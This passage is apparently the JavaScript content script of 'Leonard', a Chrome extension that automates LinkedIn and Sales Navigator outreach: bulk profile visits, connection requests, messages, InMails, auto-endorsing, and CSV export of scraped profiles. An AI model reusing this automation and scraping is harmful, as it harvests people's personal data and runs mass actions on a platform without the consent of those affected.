                            entityURN = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                        }
                    }
                } else {
                    var profile_link = $(this).find("div > a:first").attr("href");
                    if(profile_link){
                        var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                        if(entityUrnMatch && entityUrnMatch.length > 0){
                            entityURN = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                        }
                    }
                }
            }
            var is_checked = '';
            var skip_text = 'Skip';
            if(skipList){
                var skippedRec = skipList.filter(x=>x.entityUrn == entityURN)[0];
                if(skippedRec && (skippedRec.is_skipped == "true" || skippedRec.is_skipped == true)){
                    is_checked = 'checked="checked"';
                    skip_text = 'Skip';
                }
            }
            var $skip_toggle = $('<div class="checkbox checkbox-slider checkbox-slider-danger"><label><input type="checkbox" '+is_checked+' data-entityurn="'+entityURN+'" class="leonard_skip_profile"><span>'+skip_text+'</span></label></div>');
            if($(this).find(".search-result__actions").length > 0){
                $(this).find(".search-result__actions").append($skip_toggle);
            }
            if (isSalesNav) {
                if($(this).find(".result-lockup__actions").length > 0){
                    $(this).find(".result-lockup__actions").append($skip_toggle);
                } else {
                    $(this).find(".info-container").append($skip_toggle);
                }
            } else if ($(this).find(".bd").length > 0) {
                $(this).find(".bd").append($skip_toggle);
            }
            // $(this).attr("data-icons","true");
        }
    })
}

function isProfileSkipped(entityUrn){
    return skipList && skipList.length > 0 && skipList.filter(x=>(x.entityUrn == entityUrn && x.is_skipped == 'true')).length > 0;
}

function isProfilePage(){
    return $(".profile-detail, .profile-details").length > 0;
}

function addNotesandTags(){
    if(isProfilePage()){
        var sales_nav_header_class = '';
        var sales_nav_ol_class = 'mt4';
        var style_for_normal = '';
        var sales_nav_tag_class = '';
        if(isSalesNav) {
            sales_nav_header_class = 'ph5 pt5';
            sales_nav_ol_class = 'p5';
            sales_nav_tag_class = 'pv2 ph3';
        } else {
            style_for_normal = 'style="left:15px;"';
        }
        $("#leo_notes_cont, #leo_tags_cont").remove();
        var notes_html = '<div id="leo_notes_cont" class="pv-deferred-area profile-section mb2">'+
            '<div class="pv-deferred-area__content">'+
                '<section class="pv-profile-section artdeco-container-card">'+
                    '<h2 class="pv-profile-section__card-heading Sans-21px-black-85% profile-section__header '+sales_nav_header_class+' pb0">Notes<span id="leo_add_note" style="float: right; margin-top: -6px;"><button class="pv-top-card-section__inline-overflow-button button-secondary-large-muted">Add / Edit Notes</button></span></h2>'+
                    '<ol id="leo_notes" class="pv-entity__description Sans-15px-black-70% '+sales_nav_ol_class+'" style="line-height:15px;"></ol>'+
                '</section>'+
            '</div>'+
        '</div>';
        if($(".profile-detail").length > 0){
            $(".profile-detail").prepend(notes_html);
        }
        if($(".profile-details").length > 0){
            $(".profile-details").prepend(notes_html);
        }
        var tags_html = '<div id="leo_tags_cont" class="pv-deferred-area profile-section mb2">'+
            '<div class="pv-deferred-area__content">'+
                '<section class="pv-profile-section artdeco-container-card">'+
                    '<h2 class="pv-profile-section__card-heading Sans-21px-black-85% profile-section__header '+sales_nav_header_class+' pb0">Tags<span id="leo_add_tag" style="float: right; margin-top: -6px;"><button class="pv-top-card-section__inline-overflow-button button-secondary-large-muted">Add / Edit Tags</button></span></h2>'+
                    '<ol id="leo_tags" class="pv-entity__description Sans-15px-black-70% flex '+sales_nav_ol_class+'"></ol>'+
                '</section>'+
            '</div>'+
        '</div>';
        if($(".profile-detail").length > 0){
            $(".profile-detail").prepend(tags_html);
        }
        if($(".profile-details").length > 0){
            $(".profile-details").prepend(tags_html);
        }
        var add_note_html = '<div id="artdeco-modal-outlet"><artdeco-modal-overlay class="ember-view"><artdeco-modal role="dialog" tabindex="-1" aria-labelledby="notes-modal-header" size="552dp"><button class="artdeco-dismiss"><li-icon aria-hidden="true" type="cancel-icon"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="large-icon" style="fill: currentColor"><path d="M20,5.32L13.32,12,20,18.68,18.66,20,12,13.33,5.34,20,4,18.68,10.68,12,4,5.32,5.32,4,12,10.69,18.68,4Z"></path></g></svg></li-icon><span class="a11y-text">Dismiss</span></button><artdeco-modal-header class="ember-view"><h2 id="notes-modal-header" class="notes-modal-header">Notes - <span id="leo_profile_name"></span></h2></artdeco-modal-header><artdeco-modal-content class="notes-modal-content ember-view"><div class="ember-view"><div class="notes-popup-body"><div class="note-items-container add ember-view"><section class="note-add-items-section"><div class="note-add-mode-form"><textarea name="note-add" placeholder="Add note" class="note-textarea ember-text-area leonard-textarea ember-view" id="leo_note_text" maxlength="'+MAX_NOTE_CHARS+'"></textarea><div class="note-items-cta-wrapper"><div class="note-save-cancel-cta-wrapper"><span id="leo_note_chars" class="send-invite__count small-text">'+MAX_NOTE_CHARS+'</span><button id="leo_save_note" class="save-button leo_save_btn button-primary-medium ml1" '+style_for_normal+'>Save</button></div></div></div></section></div></div></div></artdeco-modal-content></artdeco-modal></artdeco-modal-overlay></div>';
        var add_tags_html = '<div id="artdeco-modal-outlet"><artdeco-modal-overlay class="ember-view"><artdeco-modal role="dialog" tabindex="-1" aria-labelledby="notes-modal-header" size="552dp"><button class="artdeco-dismiss"><li-icon aria-hidden="true" type="cancel-icon"><svg viewBox="0 0 24 24" width="24px" height="24px" x="0" y="0" preserveAspectRatio="xMinYMin meet" class="artdeco-icon" focusable="false"><g class="large-icon" style="fill: currentColor"><path d="M20,5.32L13.32,12,20,18.68,18.66,20,12,13.33,5.34,20,4,18.68,10.68,12,4,5.32,5.32,4,12,10.69,18.68,4Z"></path></g></svg></li-icon><span class="a11y-text">Dismiss</span></button><artdeco-modal-header class="ember-view"><h2 id="notes-modal-header" class="notes-modal-header">Tags - <span id="leo_profile_name"></span></h2></artdeco-modal-header><artdeco-modal-content class="notes-modal-content ember-view"><div class="ember-view"><div class="notes-popup-body"><div class="note-items-container add ember-view tags"><section class="note-add-items-section"><div class="note-add-mode-form"><select id="leo_user_tags" class="select2" multiple data-placeholder="Select tag"></select><div class="note-items-cta-wrapper"><div class="note-save-cancel-cta-wrapper"><button id="leo_save_tag" class="save-button leo_save_btn button-primary-medium ml1" '+style_for_normal+'>Save</button></div></div></div></section></div></div></div></artdeco-modal-content></artdeco-modal></artdeco-modal-overlay></div>';
        $("#leo_add_note").bind("click", function(){
            var notes_id = getLeonardID('notes');
            $('<div />',{id:notes_id}).appendTo($("body"));
            var add_note_cont = $("#"+notes_id);
            add_note_cont.html(add_note_html);
            $("#leo_note_text").bind("input", function(){
                var chars = MAX_NOTE_CHARS - $(this).val().length;
                if(chars < MAX_NOTE_CHARS){
                    $("#leo_save_note").removeAttr("disabled");
                } else {
                    $("#leo_save_note").prop("disabled",true);
                }
                $("#leo_note_chars").text(chars);
            });
            $("#leo_save_note").bind("click", function(){
                var URLMatch = location.href.match(/in\/(.*?)\//);
                var connection_id = false;
                var salesNavUrl = document.body.innerHTML.match(/flagshipProfileUrl":".*?in\/(.*?)"/);
                if(URLMatch && URLMatch.length > 0){
                    connection_id = location.href.match(/in\/(.*?)\//)[1];
                } else if(isSalesNav && salesNavUrl && salesNavUrl.length > 1){
                    connection_id = salesNavUrl[1];
                }
                var notes_text = $("#leo_note_text").val();
                saveNotesandTags(connection_id, notes_text, '', function(){
                    addNotesandTags();
                    $("#"+notes_id).remove();
                });
            });
            $(".artdeco-dismiss").bind("click", function(){
                $("#"+notes_id).remove();
            });
            $("#leo_profile_name").text($(".pv-top-card-section__name, .profile-topcard-person-entity__name").text());
            var notes_text = $("#leo_notes").text();
            $("#leo_note_text").val(notes_text);
            $("#leo_note_chars").text((MAX_NOTE_CHARS-notes_text.length));
        });
        $("#leo_add_tag").bind("click", function(){
            var tags_id = getLeonardID('tags');
            $('<div />',{id:tags_id}).appendTo($("body"));
            var add_tag_cont = $("#"+tags_id);
            add_tag_cont.html(add_tags_html);
            var leo_tags_text = $("#leo_tags").find('div').map(function(){return $(this).text()}).toArray().toString();
            var leo_tags_arr = leo_tags_text.split(',');
            getTags(function(){
                $('#leo_user_tags').html('');
                tags.forEach(function(m) {
                    var selectedHTML = '';
                    if(leo_tags_arr.indexOf(m.tag_name) >= 0) selectedHTML = 'selected="true"';
                    $('#leo_user_tags').append('<option value="' + m.id + '" '+selectedHTML+'>' + m.tag_name + '</option>');
                });
                $('#leo_user_tags').select2();
            })
            $("#leo_save_tag").bind("click", function(){
                var URLMatch = location.href.match(/in\/(.*?)\//);
                var connection_id = false;
                var salesNavUrl = document.body.innerHTML.match(/flagshipProfileUrl":".*?in\/(.*?)"/);
                if(URLMatch && URLMatch.length > 0){
                    connection_id = location.href.match(/in\/(.*?)\//)[1];
                } else if(isSalesNav && salesNavUrl && salesNavUrl.length > 1){
                    connection_id = salesNavUrl[1];
                }
                var selected_tags = $("#leo_user_tags").val();
                var tags_text = false;
                if(selected_tags){
                    tags_text = selected_tags.map(function(tagObjId){
                        return tags.filter(x=>(x.id==tagObjId))[0].tag_name;
                    }).join(',');
                }
                saveNotesandTags(connection_id, '', tags_text, function(){
                    addNotesandTags();
                    $("#"+tags_id).remove();
                });
            });
            $(".artdeco-dismiss").bind("click", function(){
                $("#"+tags_id).remove();
            });
            $("#leo_profile_name").text($(".pv-top-card-section__name, .profile-topcard-person-entity__name").text());
        })
        var URLMatch = location.href.match(/in\/(.*?)\//);
        var connection_id = false;
        var salesNavUrl = document.body.innerHTML.match(/flagshipProfileUrl":".*?in\/(.*?)"/);
        if(URLMatch && URLMatch.length > 0){
            connection_id = location.href.match(/in\/(.*?)\//)[1];
        } else if(isSalesNav && salesNavUrl && salesNavUrl.length > 1){
            connection_id = salesNavUrl[1];
        }
        if(connection_id){
            chrome.runtime.sendMessage({
                getUserTagsandNotes: true,
                connection_id: connection_id
            }, function(res){
                getTags(function(){
                    var notes = res && res.length > 0 ? res[0].notes : "";
                    var user_tags = res && res.length > 0 ? res[0].tags : "";
                    // if(notes){
                    //     $("#leo_add_note button").text("Edit Note");
                    // }
                    // if(user_tags){
                    //     // if(typeof user_tags == 'string') user_tags = user_tags.split(',');
                    //     // user_tags.forEach(function(ut){
                    //     //     var tagIdRec = tags.filter(x=>x.tag_name==ut);
                    //     //     var tagId = false;
                    //     //     if(tagIdRec && tagIdRec.length > 0){
                    //     //         tagId = tagIdRec[0].id;
                    //     //     }
                    //     //     $("#leo_user_tags option[value='"+tagId+"']").attr("selected", true);
                    //     //     console.log(tagId);
                    //     // });
                    //     // $("#leo_user_tags").select2();
                    //     $("#leo_add_tag button").text("Edit Tags");
                    // }
                    $("#leo_notes").text(notes);
                    if(typeof user_tags == 'string' && user_tags != ""){
                        user_tags = user_tags.split(',');
                        user_tags.forEach(function(ut){
                            $('<div class="profile-skills__pill static-pill flex no-wrap '+sales_nav_tag_class+' mr2"><span class="profile-skills__skill-name truncate Sans-15px-black-85%-semibold">'+ut+'</span></div>').appendTo($("#leo_tags"));
                        })
                    }
                })
            })
        }
    }
}

function initExtension() {
    setupExtensionVars(function() {
        chrome.storage.local.get('user_details', function(ud) {
            if (!ud.user_details || !ud.user_details.autoLogIn) {
                initExtCalled = false;
                return false;
            }
            user_details = ud.user_details;
            user_details.autoWish = typeof user_details.autoWish == 'string' && user_details.autoWish.length > 0 ? JSON.parse(user_details.autoWish) : user_details.autoWish;
            local_data.PLAN = user_details.user_type;
            if(local_data.PLAN == "Free Trial"){
                var delta = Math.ceil((new Date(user_details.expiry_date) - Date.now())/(24*60*60*1000));
                local_data.PLAN = "<span style='color:red;'>"+delta+" days left of "+local_data.PLAN+"</span>";
            }
            local_data.ID = user_details.id;
            if (!user_details || !user_details.profile_views_remaining_today) {
                initExtCalled = false;
                return false;
            } else {
                getLatestData(function() {
                    local_data.REMAINING_PROFILE_VIEWS = parseInt(user_details.profile_views_remaining_today);
                    local_data.REMAINING_CONNECTION_REQUESTS = parseInt(user_details.connection_requests_remaining_today);
                    local_data.REMAINING_MESSAGES = parseInt(user_details.messages_remaining_today);
                    local_data.REMAINING_INMAILS = parseInt(user_details.inmails_remaining_today);
                    if(!local_data.startedViewing && !local_data.startedScanning) local_data.rpv = local_data.REMAINING_PROFILE_VIEWS;
                    if(!local_data.startedSending) local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
                    if(!local_data.startedMessaging) local_data.rm = local_data.REMAINING_MESSAGES;
                    if(!local_data.startedMailing) local_data.rim = local_data.REMAINING_INMAILS;
                    local_data.PLAN = user_details.user_type;
                    local_data.autoFollowUp = user_details.autoFollowUp;
                    local_data.ID = user_details.id;
                    showLeonardHeader(function(isLoaded) {
                        $(".leo_container").removeAttr("hidden");
                        if (!isLoaded) {
                            setTimeout(initExtension, 500);
                            return false;
                        }
                        initViews();
                        updateUIByPlan();
                        initExtCalled = false;
                    });
                    // if (local_data.REMAINING_PROFILE_VIEWS == 0) {
                    //     showTimerPage();
                    // } else {
                    // }
                })
            }
        });
    })
}

function saveNotesandTags(connection_id, notes, tags, callback){
    chrome.runtime.sendMessage({
        saveNotesandTags: true,
        connection_id: connection_id,
        notes: notes,
        tags: tags
    }, function(){
        callback();
    })
}

function initViews(callback) {
    chrome.runtime.sendMessage({
        'getUserViews': true
    }, function(uv) {
        views = uv && uv.views || [];
        chrome.runtime.sendMessage({
            'getUserComms': true
        }, function(cm){
            recentComms = cm && cm.comms || [];
            chrome.runtime.sendMessage({
                'getUserSentConnections': true
            }, function(sc) {
                sent_connections = sc && sc.conns || [];
                updateLocalData(function() {
                    // if (local_data.REMAINING_PROFILE_VIEWS == 0) {
                    //     showTimerPage();
                    // } else {
                    // }
                    chrome.storage.local.get('nextPageRedirect', function(obj) {
                        if (obj['nextPageRedirect']) {
                            finished_in_remaining = obj['nextPageRedirect'].count ? parseInt(obj['nextPageRedirect'].count) : false;
                            finished_conns_in_remaining = obj['nextPageRedirect'].conns_count ? parseInt(obj['nextPageRedirect'].conns_count) : false;
                            finished_msgs_in_remaining = obj['nextPageRedirect'].msgs_count ? parseInt(obj['nextPageRedirect'].msgs_count) : false;
                            finished_inms_in_remaining = obj['nextPageRedirect'].msgs_count ? parseInt(obj['nextPageRedirect'].msgs_count) : false;
                            chrome.storage.local.set({
                                nextPageRedirect: false
                            }, function() {
                                leonard_stopped = false;
                                if (local_data.startedViewing && finished_in_remaining != false) {
                                    local_data.currentIdx = finished_in_remaining;
                                    $("#start_viewing").text(local_strings["STOP"]);
                                    $("#start_viewing").addClass("started");
                                    setStopLeonardBtn(true);
                                    startViewing();
                                } else if (local_data.startedScanning && finished_in_remaining != false) {
                                    local_data.currentIdx = finished_in_remaining;
                                    $("#start_scanning").text(local_strings["STOP"]);
                                    $("#start_scanning").addClass("started");
                                    setStopLeonardBtn(true);
                                    startScanning();
                                } else if (finished_conns_in_remaining != false) {
                                    local_data.currentIdx = finished_conns_in_remaining;
                                    $("#start_sending_conn").text(local_strings["STOP"]);
                                    $("#start_sending_conn").addClass("started");
                                    setStopLeonardBtn(true);
                                    startSending();
                                } else if (finished_msgs_in_remaining != false) {
                                    local_data.currentIdx = finished_msgs_in_remaining;
                                    $("#start_sending_msg").text(local_strings["STOP"]);
                                    $("#start_sending_msg").addClass("started");
                                    setStopLeonardBtn(true);
                                    startMessaging();
                                } else if (finished_inms_in_remaining != false) {
                                    local_data.currentIdx = finished_inms_in_remaining;
                                    $("#start_sending_inm").text(local_strings["STOP"]);
                                    $("#start_sending_inm").addClass("started");
                                    setStopLeonardBtn(true);
                                    startMailing();
                                }
                            });
                        }
                    });
                })
            })
        });
        if (typeof callback == 'function') {
            callback();
        }
    })
}

function setupExtensionVars(callback) {
    usersList = [];
    mapObjectUrns();
    if (!isSalesNav && location.href.indexOf(LINKEDIN_DOMAIN_URL+'sales') >= 0) {
        isSalesNav = true;
    }
    if(isSalesNav && local_data.synced == false){
        syncLinkedInTags();
    }
    if ($("code[id^=bpr-guid-]:last").length > 0) {
        var json_data = JSON.parse($("code[id^=bpr-guid-]:last").text());
        if (json_data && json_data.included) {
            usersList = json_data.included.filter(function(a) {
                return a.objectUrn
            });
            idUrnMapObj = {};
            usersList.forEach(function(a) {
                var entity_urn = a.entityUrn && a.entityUrn.replace('urn:li:fs_miniProfile:','');
                var trackingId = a.trackingId;
                idUrnMapObj[trackingId] = {
                    entityUrn : a.entityUrn,
                    publicIdentifier : a.publicIdentifier,
                    member_id : a.objectUrn,
                    trackingId : trackingId
                }
                // idUrnMapObj[a.publicIdentifier] = a.objectUrn;
            });
        }
        search_records_count = $(".results-list > li").length;
        if(search_records_count == 0 && $(".search-results li").length > 0){
            search_records_count = $(".search-results li").length
        }
        if(location.pathname.indexOf('v2') >= 0){
            search_records_count = $(".search-results__list > li").length;
        }
    } else if ($("#results").length > 0) {
        search_records_count = $("#results > li[data-li-entity-id]").length;
    } else if ($("#results-list").length > 0) {
        search_records_count = $("#results-list > li").length;
    }
    if (isSalesNav && $(".search-results .search-results__result-list li.search-results__result-item").length > 0) {
        search_records_count = $(".search-results .search-results__result-list li.search-results__result-item").length;
    }
    if (search_records_count == 0) {
        if (page_load_timer) {
            clearTimeout(page_load_timer);
            page_load_timer = false;
        }
        page_load_timer = setTimeout(function() {
            setupExtensionVars(callback);
        }, 3000);
        return false;
    }
    chrome.runtime.sendMessage({
        search_url_duplicate: true,
        is_sales_nav : isSalesNav
    }, function(obj) {
        if (obj && obj.ls_count > 1) {
            showNotification(local_strings['USING_LINKEDIN'], obj.tab_ids[0]);
            clearInterval(startInter);
            startInter = null;
            return false;
        } else {
            chrome.storage.local.get('view_premium_only', function(r) {
                if (r.view_premium_only) {
                    viewPremiumOnly = true;
                } else {
                    viewPremiumOnly = false;
                }
            })
            chrome.storage.local.get('scan_premium_only', function(r) {
                if (r.scan_premium_only) {
                    scanPremiumOnly = true;
                } else {
                    scanPremiumOnly = false;
                }
            })
            chrome.storage.local.get('connect_premium_only', function(r) {
                if (r.connect_premium_only) {
                    connectPremiumOnly = true;
                } else {
                    connectPremiumOnly = false;
                }
            })
            chrome.storage.local.get('export_campaign_conn', function(r) {
                if (r.export_campaign_conn) {
                    exportCampaignConn = true;
                } else {
                    exportCampaignConn = false;
                }
            })
            chrome.storage.local.get('export_campaign_msg', function(r) {
                if (r.export_campaign_msg) {
                    exportCampaignMsg = true;
                } else {
                    exportCampaignMsg = false;
                }
            })
            chrome.storage.local.get('export_campaign_mail', function(r) {
                if (r.export_campaign_mail) {
                    exportCampaignMail = true;
                } else {
                    exportCampaignMail = false;
                }
            })
            chrome.storage.local.get('export_campaign_visit', function(r) {
                if (r.export_campaign_visit) {
                    exportCampaignVisit = true;
                } else {
                    exportCampaignVisit = false;
                }
            })
            chrome.storage.local.get('auto_follow_users', function(r) {
                if (r.auto_follow_users) {
                    autoFollowUsers = true;
                } else {
                    autoFollowUsers = false;
                }
            })
            chrome.storage.local.get('auto_endorse_users', function(r) {
                if (r.auto_endorse_users) {
                    autoEndorseUsers = true;
                } else {
                    autoEndorseUsers = false;
                }
            })
            chrome.storage.local.get('skip_profile_with_no_pic', function(r) {
                if (r.skip_profile_with_no_pic) {
                    skipProfileWithNoPic = true;
                } else {
                    skipProfileWithNoPic = false;
                }
            })
            chrome.storage.local.get('message_premium_only', function(r) {
                if (r.message_premium_only) {
                    messagePremiumOnly = true;
                } else {
                    messagePremiumOnly = false;
                }
            })
            chrome.storage.local.get('inmail_premium_only', function(r) {
                if (r.inmail_premium_only) {
                    inMailPremiumOnly = true;
                } else {
                    inMailPremiumOnly = false;
                }
            })
            chrome.storage.local.get('send_using_credits', function(r) {
                if (r.send_using_credits) {
                    sendUsingCredits = true;
                } else {
                    sendUsingCredits = false;
                }
            })
        }
        if (typeof callback == 'function') {
            callback();
        }
    });
}

function closePopup(){
    $('.leo_nav li.active').popover('hide');
    $('body').off('click');
    var popover_data = $('.leo_nav li.active').data('bs.popover');
    popover_data.inState.click = false;
    $('.leo_nav li.active').data("bs.popover", popover_data);
}

function showLeonardHeader(callback) {
    // if($("#Ext_Header").length > 0) $("#Ext_Header").remove();
    if ($("#Ext_Header").length > 0 && typeof callback == 'function'){
        callback(true);
        return false;
    }
    var extMainCont = $('#srp_main_');
    if (extMainCont.length == 0 && !isSalesNav && $(".sub-nav--trans-nav").length == 1) {
        extMainCont = $(".sub-nav--trans-nav");
        $('<div />', {'id': 'Ext_Header'}).prependTo(extMainCont);
    } else if (isSalesNav) {
        extMainCont = $(".spotlights-and-results-container");
        $('<div />', {'id': 'Ext_Header'}).prependTo(extMainCont);
    } else {
        extMainCont = $(".search-results-container .display-flex");
        $('<div />', {'id': 'Ext_Header'}).insertBefore(extMainCont);
    }
    if(extMainCont.length == 0 && isSalesNav){
        extMainCont = $(".search-results");
        $('<div />', {'id': 'Ext_Header'}).prependTo(extMainCont);
    }
    if (extMainCont.length == 0 && typeof callback == 'function') {
        callback(false);
        return false;
    }

    var home_page = chrome.extension.getURL('template/home.html');
    if(user_details.user_plan == 'Cancelled'){
        home_page = chrome.extension.getURL('template/cancelled.html');
    }
    $.get(home_page, function(resp) {
        if(resp.match(/{{(.*?)}}/g)){
            resp.match(/{{(.*?)}}/g).forEach(function(a) {
                var m = local_data[a.replace(/\{|\}/g, '')] || 0;
                resp = resp.replace(a, m);
            });
        }
        $("#Ext_Header").addClass("new_design_header");
        $('#Ext_Header').html(resp);
        if (isSalesNav) {
            $("#Ext_Header").addClass("sales_nav_temp_header");
            $("#stopLeonard").addClass("sales_nav_temp_header");
        }
        chrome.runtime.sendMessage({getSpecialDeals:true},function(res){
            if(res.msg){
                $('.special_deals').html($('<a />',{class:'blink',href:res.link,target:'_blank'}).text(res.msg));
            }
        })
        if(user_details.user_plan == 'Cancelled'){
            $(".upgradeBtn").bind("click", function(){
                chrome.runtime.sendMessage({
                    open_new_tab: true,
                    url: 'https://meetleonard.com/upgrade/'
                });
            })
        }
        if (isSalesNav) {
            $(".hunt_ops").css("width", $(".results-header").width());
            chrome.storage.local.get('sales_tab', function(o) {
                if (o && o.sales_tab) {
                    $(".leo_nav li:eq('" + o.sales_tab + "')").click();
                }
            })
        } else {
            $("[data-tab='inmail']").attr("disabled",true);
        }
        /*  Template listeners  */

        addListenerToTemplate();

        $("#download_btn").bind("click", function() {
            showNotification(local_strings['PREPARING_DOWNLOAD']);
            chrome.runtime.sendMessage({
                'getUserViews': true
            }, function(uv) {
                createCSVFile(uv.views, function(csv_data) {
                    var fileName = "Leonard_profiles_" + getTodaysDate();
                    var uri = 'data:text/csv;charset=utf-8,' + escape(csv_data);
                    var link = document.createElement("a");
                    link.href = uri;
                    link.style = "visibility:hidden";
                    link.download = fileName + ".csv";
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    return false;
                })
            })
        });
        $("#stopLeonard").bind("click", function() {
            stopLeonard(false,true);
        });
        $(".leo_nav li").bind("click", function() {
            var that = this;
            var selected_tab = $(this).attr('data-tab');
            if ($(this).attr("disabled") == "disabled") {
                if(!initializingPopups){
                    if($(this).hasClass('upgrade_membership')){
                        showNotification("Feature not available on "+user_details.user_type+" Plan.\nClick here to upgrade.", 'payment');
                    } else if($(this).text() == 'InMail' && !isSalesNav){
                        showNotification(local_strings['ONLY_SALES_NAV']);
                    } else if(selected_tab == 'export'){
                        // showNotification("I'm downloading your 1st connections data.\nPlease wait till Export is active!");
                        chrome.runtime.sendMessage({
                            showProgress: true,
                            completed: parseInt(currentScrapeIdx*100/connections_all.length)
                        })
                    } else {
                        showNotification($(this).text() + local_strings['UNDER_DEVELOPMENT']);
                    }
                }
                return false;
            }
            if(selected_tab == 'export'){
                chrome.runtime.sendMessage({
                    exportContacts : true
                });
                return false;
            }
            if (selected_tab != 'go_to_crm') {
                $(".leo_nav li").removeClass("active");
                $(that).addClass("active");
                $(that).unbind("shown.bs.popover");
                $(that).unbind("hidden.bs.popover");
                $(that).popover({
                    html: true,
                    placement: 'bottom',
                    content: function() {
                        var popover_html = $("#" + selected_tab + "_content").html();
                        if(user_details.user_type == 'Free' && ((new Date()-new Date(user_details.date_joined)) > trial_days_in_ms)){
                            showUpgradePage(function(upgrade_page_cont){
                                popover_html = upgrade_page_cont;
                            });
                            return popover_html;
                        } else if(((selected_tab == 'visit_profiles' || selected_tab == 'scan_profiles') && local_data.rpv == 0) || (selected_tab == 'connection_invitation' && local_data.rcr == 0) || (selected_tab == 'message' && local_data.rm == 0) || (selected_tab == 'inmail' && local_data.rim == 0)){
                            showTimerPage(function(timer_page_cont){
                                popover_html = timer_page_cont;
                            });
                            return popover_html;
                        } else {
                            popover_html = popover_html
                                .replace(/range_slider_temp/, 'range_slider')
                                .replace(/remaining_temp/, 'remaining')
                                .replace(/remaining_conn_req_temp/, 'remaining_conn_req')
                                .replace(/conn_range_slider_temp/, 'conn_range_slider')
                                .replace(/selInvMes_temp/, 'selInvMes')
                                .replace(/selFollUpMes_temp/, 'selFollUpMes')
                                .replace(/start_sending_conn_temp/, 'start_sending_conn')
                                .replace(/start_viewing_temp/, 'start_viewing')
                                .replace(/custom_inv_msg_temp/, 'custom_inv_msg')
                                .replace(/custom_fol_msg_temp/, 'custom_fol_msg')
                                .replace(/inv_div_temp/, 'inv_div')
                                .replace(/fol_div_temp/, 'fol_div')
                                .replace(/conn_inv_tags_temp/, 'conn_inv_tags')
                                .replace(/conn_inv_respond_temp/,'conn_inv_respond')
                                .replace(/autoFollowUp_temp/g,'autoFollowUp')
                                .replace(/msg_range_slider_temp/, 'msg_range_slider')
                                .replace(/remaining_msg_req_temp/, 'remaining_msg_req')
                                .replace(/msg_div_temp/, 'msg_div')
                                .replace(/selMes_temp/, 'selMes')
                                .replace(/custom_msg_temp/, 'custom_msg')
                                .replace(/start_att_msg_temp/, 'start_att_msg')
                                .replace(/start_sending_msg_temp/, 'start_sending_msg')
                                .replace(/message_tags_temp/, 'message_tags')
                                .replace(/start_sending_inm_temp/, 'start_sending_inm')
                                .replace(/inm_range_slider_temp/, 'inm_range_slider')
                                .replace(/remaining_inm_req_temp/, 'remaining_inm_req')
                                .replace(/inm_div_temp/, 'inm_div')
                                .replace(/selInm_temp/, 'selInm')
                                .replace(/start_att_inm_temp/, 'start_att_inm')
                                .replace(/custom_inm_subject_temp/, 'custom_inm_subject')
                                .replace(/custom_inm_temp/, 'custom_inm')
                                .replace(/inmails_tags_temp/, 'inmails_tags')
                                .replace(/view_tags_temp/, 'view_tags')
                                .replace(/export_campaign_conn_temp/g, 'export_campaign_conn')
                                .replace(/export_campaign_msg_temp/g, 'export_campaign_msg')
                                .replace(/export_campaign_mail_temp/g, 'export_campaign_mail')
                                .replace(/export_campaign_visit_temp/g, 'export_campaign_visit')
                                .replace(/auto_follow_users_temp/g, 'auto_follow_users')
                                .replace(/skip_profile_with_no_pic_visit_temp/g, 'skip_profile_with_no_pic_visit')
                                .replace(/skip_profile_with_no_pic_conn_temp/g, 'skip_profile_with_no_pic_conn')
                                .replace(/skip_profile_with_no_pic_msg_temp/g, 'skip_profile_with_no_pic_msg')
                                .replace(/skip_profile_with_no_pic_mail_temp/g, 'skip_profile_with_no_pic_mail')
                                .replace(/auto_endorse_users_temp/g, 'auto_endorse_users')
                                .replace(/scan_tags_temp/g, 'scan_tags')
                                .replace(/skip_profile_with_no_pic_scan_temp/g, 'skip_profile_with_no_pic_scan')
                                .replace(/export_campaign_scan_temp/g, 'export_campaign_scan')
                                .replace(/start_scanning_temp/g, 'start_scanning');
                        }
                        return popover_html;
                    }
                }).bind("shown.bs.popover", function() {
                    // $(".tag_sales").hide();
                    // $(".tag_sales input[type=checkbox]").removeAttr("checked");
                    if(isSalesNav){
                        $(".tag_sales").show();
                    } else {
                        $(".tag_sales").hide();
                    }
                    if (typeof initMethod == 'function') {
                        initMethod();
                        addListenerToTemplate();
                    } else {
                        chrome.runtime.sendMessage({error: 'initMethod not found', func: 'showLeonardHeader'});
                        return false;
                    }
                    if(local_data.selectedInMailAttachments.length > 0){
                        displayAttachments(local_data.selectedInMailAttachments, 'selectedInMailAttachments');
                    } else if(local_data.selectedMessageAttachments.length > 0) {
                        displayAttachments(local_data.selectedMessageAttachments, 'selectedMessageAttachments');
                    }
                    if (selected_tab == 'connection_invitation') {
                        populateTemplates(true, function() {
                            if (local_data.startedSending) {
                                $("#start_sending_conn").text("STOP");
                                $("#start_sending_conn").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if (local_data.startedViewing) {
                                $("#start_viewing").text("STOP");
                                $("#start_viewing").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if (local_data.startedScanning) {
                                $("#start_scanning").text("STOP");
                                $("#start_scanning").addClass("started");
                                setStopLeonardBtn(true);
                            }
                            if ($("#selInvMes").length > 0 && local_data.selectedInvitationMessage) {
                                var selectedInvitationMessageId = false;
                                if(local_data.selectedInvitationMessage){
                                    selectedInvitationMessageId = invitationMessages.filter(x=>x.template_content == local_data.selectedInvitationMessage)[0].id;
                                }
                                if ($("#selInvMes option[value='" + selectedInvitationMessageId + "']").length > 0) {
                                    // $("#inv_div .template_selection").val("saved").trigger("change");
                                    // $("#selInvMes option[value='"+local_data.selectedInvitationMessage+"']").attr("selected","true");
                                    // $("#selInvMes").trigger("change");
                                } else {
                                    $("#inv_div .template_selection").val("custom").trigger("change");
                                    $("#custom_inv_msg").val(local_data.selectedInvitationMessage);
                                }
                            }
                            if ($("#selFollUpMes").length > 0 && local_data.selectedFollowUpMessage) {
                                var selectedFollowUpMessageId = false;
                                if(local_data.selectedFollowUpMessage){
                                    selectedFollowUpMessageId = followUpMessages.filter(x=>x.template_content == local_data.selectedFollowUpMessage)[0].id;
                                }
                                if ($("#selFollUpMes option[value='" + selectedFollowUpMessageId + "']").length > 0) {
                                    // $("#fol_div .template_selection").val("saved").trigger("change");
